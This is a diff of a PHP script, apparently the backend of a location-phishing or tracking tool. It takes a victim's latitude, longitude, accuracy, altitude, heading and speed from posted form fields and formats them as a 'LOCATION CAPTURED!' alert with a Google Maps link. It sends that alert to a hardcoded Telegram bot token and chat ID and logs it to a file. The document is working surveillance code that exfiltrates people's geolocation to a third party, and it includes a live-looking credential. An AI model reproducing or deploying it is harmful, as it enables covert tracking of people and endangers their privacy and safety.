@@ -1,28 +1,54 @@
 <?php
-header('Content-Type: text/html');
-
-// --- YOUR CONFIG ---
+// ******************************************
+// CONFIGURATION
+// ******************************************
 $botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
 $chatId = "6862649950";
+// ******************************************
 
-// 1. Capture Data
-$lat = $_POST['Lat']; $lon = $_POST['Lon']; $acc = $_POST['Acc'];
-$alt = $_POST['Alt']; $dir = $_POST['Dir']; $spd = $_POST['Spd'];
+// Receive Data
+$lat = $_POST['Lat'];
+$lon = $_POST['Lon'];
+$acc = $_POST['Acc'];
+$alt = $_POST['Alt'];
+$dir = $_POST['Dir'];
+$spd = $_POST['Spd'];
 
-// 2. Format Telegram Message
-$maps = "https://www.google.com/maps/place/$lat+$lon";
-$msg = "*Location Captured!* \n\n" .
-       "Lat: $lat\nLon: $lon\nAcc: $acc m\n" .
-       "Alt: $alt\nDir: $dir\nSpd: $spd\n\n" .
-       "[View on Google Maps]($maps)";
+// Clean data for Google Maps Link (Remove " deg" text)
+$lat_clean = str_replace(" deg", "", $lat);
+$lon_clean = str_replace(" deg", "", $lon);
+$google_maps = "https://www.google.com/maps/place/" . $lat_clean . "," . $lon_clean;
 
-// 3. Send to Telegram
-$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg) . "&parse_mode=Markdown";
-file_get_contents($url);
+// Format Message
+$message = "<b>📍 LOCATION CAPTURED!</b>\n\n";
+$message .= "<b>🌍 Latitude:</b> <code>" . $lat . "</code>\n";
+$message .= "<b>🌎 Longitude:</b> <code>" . $lon . "</code>\n\n";
+$message .= "<b>🎯 Accuracy:</b> " . $acc . "\n";
+$message .= "<b>🏔 Altitude:</b> " . $alt . "\n";
+$message .= "<b>🧭 Direction:</b> " . $dir . "\n";
+$message .= "<b>🚗 Speed:</b> " . $spd . "\n\n";
+$message .= "<b>🗺 <a href='" . $google_maps . "'>Open in Google Maps</a></b>";
 
-// 4. Save Locally
-$data = array('lat'=>$lat, 'lon'=>$lon, 'acc'=>$acc, 'alt'=>$alt, 'dir'=>$dir, 'spd'=>$spd);
+// Send to Telegram
+$website = "https://api.telegram.org/bot" . $botToken;
+$params = [
+    'chat_id' => $chatId,
+    'text' => $message,
+    'parse_mode' => 'HTML',
+    'disable_web_page_preview' => false
+];
+
+$ch = curl_init($website . '/sendMessage');
+curl_setopt($ch, CURLOPT_HEADER, false);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$result = curl_exec($ch);
+curl_close($ch);
+
+// Save Log
 $f = fopen('../../logs/result.txt', 'w+');
-fwrite($f, json_encode($data));
+fwrite($f, $message);
 fclose($f);
 ?>
